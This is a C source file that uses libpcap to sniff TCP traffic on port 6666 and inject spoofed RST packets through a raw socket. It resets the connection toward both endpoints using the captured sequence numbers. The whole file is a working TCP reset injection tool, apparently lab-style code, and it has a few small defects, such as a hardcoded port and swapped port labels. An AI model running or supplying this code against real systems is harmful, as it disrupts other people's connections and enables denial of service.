#include<stdio.h>
#include<pcap.h>
#include<stdlib.h>
#include<netinet/ip.h>
#include<netinet/tcp.h>
#include<string.h>
#include<arpa/inet.h>
#include<unistd.h>   

#define _USE_BSD // TO use the BSD IP header
#define _FAVOR_BSD // TO use the BSD TCP header

#define TCPSYN_LEN 20
#define MAXBYTES2CAPTURE 2048

typedef struct pseudo_tcp_header{
    uint32_t src;
    uint32_t dst;
    uint8_t zero;
    uint8_t protocol;
    uint16_t len;
}tcp_pseudohdr;

unsigned short in_cksum(unsigned short *addr,int len){
    register int sum = 0;
    u_short answer = 0;
    register u_short *w = addr;
    register int nleft = len;

    /*
    *Our algorithm is simple, using a 32 bit accumulator (sum), we add
    *up 16 bit words, and at the end, fold back all the carry bits
    *from the top 16 bits into the lower 16 bits.
    */

    while(nleft > 1){
        sum += *w++;
        nleft -= 2;
    }
    // mop up an odd byte, if necessary
    if(nleft == 1){
        *(u_char *)(&answer) = *(u_char *)w;
        sum += answer;
    }
    // add back carry outs from top 16 bits to low 16 bits
    sum = (sum >> 16) + (sum & 0xffff); // add
    sum += (sum >> 16); // add carry
    answer = ~sum;// truncate to 16 bits
    return(answer);
}

int tcp_send_reset(u_int32_t seq, u_int32_t src_ip, u_int32_t dest_ip, u_int32_t src_port, u_int32_t dest_port){
    
    int rawsocket = 0;
    int one = 1;
    
    char packet[sizeof(struct ip) + sizeof(struct tcphdr)];

     struct ip *ipheader = (struct ip*)packet;
     struct tcphdr *tcpheader = (struct tcphdr*)(packet + sizeof(struct ip));

     tcp_pseudohdr pseudohdr;

     char tcpcsumblock[sizeof(tcp_pseudohdr) + TCPSYN_LEN];
     struct sockaddr_in dstaddress;

     memset(&pseudohdr, 0, sizeof(tcp_pseudohdr));
     memset(&dstaddress, 0, sizeof(dstaddress));
     memset(&packet, 0, sizeof(packet));

     dstaddress.sin_family = AF_INET;
     dstaddress.sin_port = 0;
     dstaddress.sin_addr.s_addr = dest_ip;

     rawsocket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

        if(rawsocket < 0){
            printf("Tcp_send_reset(): Socket error\n");
            exit(rawsocket);
        }

        if(setsockopt(rawsocket, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0){
            printf("Tcp_send_reset(): setsockopt error\n");
            exit(-1);
        }

        ipheader->ip_hl = 5; //Header length in octal number
        ipheader->ip_v = 4; //AF_INET ipv4
        ipheader->ip_tos = 0; //TYPE of service 
        ipheader->ip_len = htons(sizeof(struct tcphdr) + sizeof(struct ip));
        ipheader->ip_off = 0; // Fragment offset
        ipheader->ip_ttl = 64; // time to live 
        ipheader->ip_p = 6; //tcp = 6, udp = 17
        ipheader->ip_sum = 0;
        ipheader->ip_id = htons(1234); //just any number
        ipheader->ip_src.s_addr = src_ip;
        ipheader->ip_dst.s_addr = dest_ip;

        tcpheader->th_seq = seq;
        tcpheader->th_ack = htonl(1);
        tcpheader->th_off = 5; //IP header length
        tcpheader->th_flags = TH_RST; // we are setting the RST flag
        tcpheader->th_win = htons(1234) + rand() % 1000; //under 9999
        tcpheader->th_urp = 0; // urgent pointer, just leave it as zero
        tcpheader->th_sport = src_port;
        tcpheader->th_dport = dest_port;
        tcpheader->th_sum = 0;

        pseudohdr.src = src_ip;
        pseudohdr.dst = dest_ip;
        pseudohdr.zero = 0;
        pseudohdr.protocol = 6;
        pseudohdr.len = htons(sizeof(struct tcphdr)); 

        memcpy(&tcpcsumblock, &pseudohdr, sizeof(tcp_pseudohdr));
        memcpy(tcpcsumblock+sizeof(tcp_pseudohdr), tcpheader, sizeof(struct tcphdr));

        tcpheader->th_sum = in_cksum((unsigned short*)(tcpcsumblock), sizeof(tcpcsumblock));
        ipheader->ip_sum = in_cksum((unsigned short*)ipheader, sizeof(struct ip));

        if(sendto(rawsocket, packet, ntohs(ipheader->ip_len), 0,(struct sockaddr *) &dstaddress, sizeof(dstaddress)) < 0){
            printf("tcp_send_rest():send_to: Cannot send RST\n");
            return -1;
        }

        printf("Sent RST packet: \n");
        printf("\tSRC:PORT %s:%d\n",inet_ntoa(ipheader->ip_src), ntohs(tcpheader->th_sport));
        printf("\tDEST:PORT %s:%d\n",inet_ntoa(ipheader->ip_dst), ntohs(tcpheader->th_dport));
        printf("\tSEQ %u\n",ntohl(tcpheader->th_seq));
        printf("\tACK %u\n",ntohl(tcpheader->th_ack));

        close(rawsocket);

        return 0;

}

/*
* usage: ./binary_file <interface> <port>
*/
int main(int argc, char *argv[]){

    pcap_t *desc;
    char error[PCAP_ERRBUF_SIZE];
    char fillter_expression[255] = "((tcp[13] == 0x10) or (tcp[13] == 0x18)) and port 6666";
    struct bpf_program fp;
    // char *device = NULL;
    bpf_u_int32 ip;
    bpf_u_int32 netmask;
    struct ip *iphdr = NULL;
    struct tcphdr *tcphdr = NULL;
    const u_char *packet;
    struct pcap_pkthdr header;
    int count = 0;


    if(argc != 3){
        printf("Usage: %s <interface>\n", argv[0]);
        exit(0);
    }

    desc = pcap_open_live(argv[1], MAXBYTES2CAPTURE, 1, 1, error);
    if(desc == NULL){
        printf("%s\n",error);
        exit(-1);
    }else{
        printf("Listening on %s.......\n", argv[1]);
    }

    if(pcap_compile(desc, &fp, fillter_expression, 0, netmask) == -1){
        fprintf(stderr, "Couldn't parse filter %s: %s\n", fillter_expression, pcap_geterr(desc));
        exit(-1);
    }

    if(pcap_setfilter(desc, &fp) == -1){
        fprintf(stderr, "Cannot set filter using pcap_setfilter %s: %s\n", fillter_expression, pcap_geterr(desc));
        exit(-1);
    }

    while(1){
        packet = pcap_next(desc, &header);
        if(packet == NULL){
            printf("Error: Cannot capture packet\n");
            return -1;
        }else{
            iphdr = (struct ip*)(packet + 14);
            tcphdr = (struct tcphdr*)(packet + 14 + 20);
            if (1){ 
                printf("-----------------------------------------------------------\n");
                printf("Recevied packet #%d:\n",++count);
                printf("\tACK: %u\n",ntohl(tcphdr->th_ack));
                printf("\tSEQ: %u\n",ntohl(tcphdr->th_seq));
                printf("\tDEST IP: %s\n",inet_ntoa(iphdr->ip_dst));
                printf("\tSRC IP: %s\n",inet_ntoa(iphdr->ip_src));
                printf("\tDEST PORT: %d\n",ntohs(tcphdr->th_sport));
                printf("\tSRC PORT: %d\n",ntohs(tcphdr->th_dport));

                tcp_send_reset(tcphdr->th_ack, 
                                iphdr->ip_dst.s_addr, 
                                iphdr->ip_src.s_addr,
                                tcphdr->th_dport, 
                                tcphdr->th_sport);
                    
                tcp_send_reset(ntohl(tcphdr->th_ack)+1, 
                                        iphdr->ip_src.s_addr, 
                                        iphdr->ip_dst.s_addr,
                                        tcphdr->th_sport, 
                                        tcphdr->th_dport);
            }
        }
    }
    pcap_close(desc);
    return 0;
}